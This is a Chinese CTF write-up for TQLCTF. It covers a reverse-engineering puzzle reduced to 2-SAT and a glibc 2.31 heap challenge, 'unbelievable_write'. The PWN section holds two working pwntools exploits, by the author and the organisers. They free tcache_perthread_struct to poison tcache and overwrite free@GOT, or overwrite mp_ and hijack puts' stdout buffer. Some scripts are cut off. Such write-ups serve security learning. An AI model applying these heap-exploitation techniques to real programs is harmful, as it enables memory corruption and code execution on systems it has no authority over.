
# [CTF] TQLCTF-RE PWN方向部分题目详细分析与题解

- 原帖: `https://www.52pojie.cn/forum.php?mod=viewthread&tid=1601994`
- 抓取时间: 2026-11-01T23:33:53

### RE

#### Tales of the Arrow

在遇到这题以前甚至都没接触过2-sat问题，所以这次也对这个问题做个概述吧。

以下内容摘自OI WIKI：

> 2-SAT，简单的说就是给出`n`个集合，每个集合有两个元素，已知若干个，表示`a`与`b`矛盾（其中`a`与`b`属于不同的集合）。然后从每个集合选择一个元素，判断能否一共选`n`个两两不矛盾的元素。

而本题关键如下：

```
def get_lit(i):
    return (i+1) * (2*int(bits[i])-1)

for t in range(N):
    i = random.randint(0,n-1)
    p = random.randint(0,2)
    true_lit = get_lit(i)
    for j in range(3):
        if j == p:
            print(true_lit)
        else:
            tmp = random.randint(0,n-1)
            rand_true = get_lit(tmp)
            if random.randint(0,3)==0:
                print(rand_true)
            else:
                print(-rand_true)
```

每轮打印比特流中的随机三位的比特状态，但这个状态有可能会取反。且取反与否发生的概率是0.5。

一开始是3-sat问题，每轮必有一个数是真实状态，另外两个数则可真可假。但3-sat是NP完全问题，基本属于不可解。所以首先我们根据明文的特殊条件消除不确定性。

因为字符串必定是可打印的字符串，其由ASCII码组成，最高位必定为0。那么这一位的状态必定是负数，如果打印出该位的状态是正数，则表示它并非必然真值，那么该组数据中另外两个必有一个为真。如果将所有带有上述情况的组别取出，问题便被缩减到2-sat，即必有一真，另一者可真可假。

2-sat问题存在多项式解法(这是结论，笔者并没有证明过)，即在数据量足够的情况下，该问题会有唯一解。本题一共给出了5000组数据，符合本条件。

而本题之后的解法也很朴素，在二选一的条件下，如果又出现了“必为负数”的位被以正数打印出来，那么最后一个数就必定真值了，将所有确定真值的位全都统计下来，就能还原完整的比特流。

参考Nu1L发布的WP自己改的：

```
f = open("output.txt")
n = int(f.readline().rstrip('\n'))
N = int(f.readline().rstrip('\n'))
x=[]
for i in range(1,5000):
    x1=int(f.readline())
    x2=int(f.readline())
    x3=int(f.readline())
    x.append([x1,x2,x3])
true_numer=[]
for i in range(n//8):
    true_numer.append(-8*i-1)
flag=[]
for i in range(n):
    flag.append(0)
for i in x:
    if(((-i[0] in true_numer) + (-i[1] in true_numer) + (-i[2] in true_numer))==2):
        count+=1
        for j in range(3):
            if((i[j] not in true_numer)and(-i[j]not in true_numer)):
                    true_numer+= [i[j]]
for i in true_numer:
    if(i
```

### PWN

#### unbelievable_write

任意地址`free`，没有泄露，没有PIE，本该是道简单题，结果做了一整天......看完官方WP之后发现自己还是想的太少了，不过我自己的方法姑且也打通了，所以先从笔者的方法开始吧。

libc版本是2.31，已经有tcache了。因为此前我很少接触这个部分，所以这次记的详细一些(个人其实不太愿意在需要之前主动去掌握利用方式，这看着有些像是在“为了利用而利用”)。

程序逻辑这里不再复述，唯一值得注意的就是，它会很快就把本轮开辟的chunk释放掉，所以很难在Bin中布置chunk。

任意地址`free`允许我们直接把`tcache_perthread_struct`释放，其结构如下：

```
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];//TCACHE_MAX_BINS=64
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

typedef struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;
} tcache_entry;
```

可知该结构体大小为0x290，且能够控制Tcache bin的各项数据，包括链表和计数。

所以我们首先把它释放掉，然后向其中填充数据：

```
#首先我们先开辟一个chunk让它放到tcache bin里，事后备用
payload1='aaaaaaaa'
create_chunk(0x28,payload1)

#然后释放tcache_perthread_struct
free_index(-0x290)

#接下来将tcache里的count全都置7，表示装满，以后的chunk就不会再放到这里了
#同时在里面将几个next指向free_got和target_addr
#这样我们之后就能向free_got和target写入数据了
payload1=(p16(7)*0x28).ljust(128,b'\x00')+(p64(free_got)+p64(target_addr)+p64(0)+p64(0))
create_chunk(0x288,payload1)
```

在写入数据之后，它会立刻把`tcache_perthread_struct`释放掉，不过现在会因为Tcache Bin已经满了，而被放到Unsorted Bin里。Bin结构如下：

```
tcachebins
0x20 [64480]: 0x404018 (free@got.plt) —▸ 0x7f1f03f31850 (free) ◂— endbr64 
0x30 [1031]: 0x404080 (target) ◂— 0xfedcba9876543210
.......
0x280 [  7]: 0x0
0x290 [  7]: 0x0
unsortedbin
all: 0x1866000 —▸ 0x7f1f0407fbe0 (main_arena+96) ◂— 0x1866000
```

首先我们先开辟0x50大小的chunk，将Unsorted Bin里的块分割开，避免里面挂着`tcache_perthread_struct`的头部(原因之后会解释)。

```
#这里payload1没变，其实填什么都行，目的只是分割罢了
create_chunk(0x48,payload1)

#然后将free_got写成main，而0x401040是默认数据
#在从tcache bin中获取chunk时，会将key部分写为0，这会导致free的下一个函数被清零
#所以恢复其中未装载时的状态，防止调用它时发生异常
payload1=p64(main_addr)+p64(0x401040)
create_chunk(0x18,payload1)

#然后再把target拿下来，随便写点数据进去就行了，只要不是原数就行
create_chunk(0x28,payload1)

#最后我们调用c3函数即可
open_flag()
```

如果我们事前没有切割Unsorted Bin，会因为2.31版本的libc检测，发生如下异常：

> `malloc()`: unsorted double linked list corrupted

因为之前Unsorted Bin中挂的是`tcache_perthread_struct`，在从tcache中取出chunk的时候，会把`count`减一，导致`fd`指针无所指向，构不成回环而错误(前几个版本还不这么严格，2.31显然变得苛刻了不少)

但这个错误是发生的`puts`时的，该函数会在输出时为字符串开辟堆空间，所以在开辟时企图从Unsorted Bin分配时才被检测到，不会影响从Tcache Bin中的分配。

另外，还需要注意的一点是，不能直接把`free_got`写成`c3`函数中绕过检查的地址。最后也会crash在`puts`中。但笔者目前不知道为什么写成`main`就可以，而写成`c3`就会crash，如果有师傅知道的话务必教教我。

笔者自己的完整EXP：

```
from pwn import *
context.log_level = 'debug'
p = process('./pwn')
elf=ELF('./pwn')
malloc=0x401387
free=0x4013fd
ret=0x40154D

free_got=elf.got['free']
target_addr=0x404080
ptr_addr=free_got
main=0x40152D
mas=0x401473
mas=main

def create_chunk(size,context):
    p.sendline(str(1))
    p.sendline(str(size))
    p.sendline(context)

def free_index(index):
    p.sendline(str(2))
    p.sendline(str(index))

def open_flag():
    p.sendline(str(3))

payload1='aaaaaaaa'
create_chunk(0x28,payload1)

free_index(-0x290)
payload1=(p16(7)*0x28).ljust(128,b'\x00')+(p64(ptr_addr)+p64(target_addr)+p64(0)+p64(0))
create_chunk(0x288,payload1)

create_chunk(0x48,payload1)
payload1=p64(mas)+p64(0x401040)
create_chunk(0x18,payload1)
create_chunk(0x28,payload1)

open_flag()
p.interactive()
```

然后回到官方WP，出题人表示，能写`got`纯粹是一个意外，它的本意是利用io，大致逻辑如下：

> - 首先释放`tcache_perthreadstruct`，然后修改`mp`，该值确定了tcache bin中最大能容纳的chunk大小，让0x1000等chunk也使用tcache
> - 同时在tcache bin中挂上`target`，然后在使用`stdout`时会从中申请chunk，并将数据写进该chunk

```
static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))
  .arena_test = NARENAS_FROM_NCORES (1)
#if USE_TCACHE
  ,
  .tcache_count = TCACHE_FILL_COUNT,
  .tcache_bins = TCACHE_MAX_BINS,
  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),
  .tcache_unsorted_limit = 0 /* No limit.  */
#endif
};
```

官方EXP如下：(笔者自行添加了注释)

```
#!/usr/bin/env python3
from pwn import *
context(os='linux', arch='amd64')
#context.log_level='debug'

def exp():
    io = process('./pwn', stdout=PIPE)
    def malloc(size, content):
        io.sendlineafter(b'>', b'1')
        io.sendline(str(int(size)).encode())
        io.send(content)

    def tcache_count(l):
        res = [b'\x00\x00' for i in range(64)]
        for t in l:
            res[(t - 0x20)//0x10] = b'\x08\x00'
        return b''.join(res)

    try:
        #在top chunk中布置0x404078，扩大tcache之后，这些都会变为next指针
        malloc(0x1000, p64(0x404078)*(0x1000//8))
        #释放tcache_perthread_struct
        io.sendlineafter(b'>', b'2')
        io.sendline(b'-656')
        #首先把0x290的count置8，让tcache_perthread_struct放进unsorted bin
        malloc(0x280, tcache_count([0x290]) + b'\n')
        #然后分割tcache_perthread_struct，让tcache bin中的0x400和0x410项放入main_arena+96
        malloc(0x260, tcache_count([0x270]) + b'\n')
        #然后把0x400和0x410也拉满，然后把0x400里的地址低位改成0xf290
        #这是单纯的爆破，希望它能指向&mp_+0x10
        malloc(0x280, tcache_count([0x400, 0x410, 0x290]) + b'\x01\x00'*4*62 + b'\x90\xf2' + b'\n')
        #倘若指向了&mp_+0x10，那么就修改数据扩大tcache
        malloc(0x3f0, flat([
            0x20000,
            0x8,
            0,
            0x10000,
            0, 0, 0,
            0x1301000,
            2**64-1,
        ]) + b'\n')
        #调用puts，让它为stdout开辟缓冲区，此时会从tcache中获取chunk
        #但tcache中已经被布置了0x404078，所以会得到此处内存
        #并且这个内存处会被陷入puts的字符串
        io.sendlineafter(b'>', b'3')
        #此时target已被修改，直接调用即可成功
        io.sendlineafter(b'>', b'3')
        flaaag = io.recvall(timeout=2)
        print(flaaag)
        io.close()
        return True
    except:
        io.close()
        return False

i = 0
while i 
```

另外补充一些内容。虽然之前知道`vtable`的跳转，但我没深究过，这次遇到了，所以顺便做点总结。

`puts`函数在调用时会通过`vtable`访问`_IO_file_xsput`函数，该函数才是真正的`puts`实现，调用过程如下：

> `puts`-->`_IO_file_xsputn`-->`_IO_file_overflow`-->`_IO_doallocbuf`
> -->`_IO_file_doallocate`

`_IO_file_doallocate`中真正调用`malloc`开辟缓冲区，调用源码：

```
_IO_new_file_overflow (FILE *f, int ch)
{
    ......
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
    {
      _IO_doallocbuf (f);
```
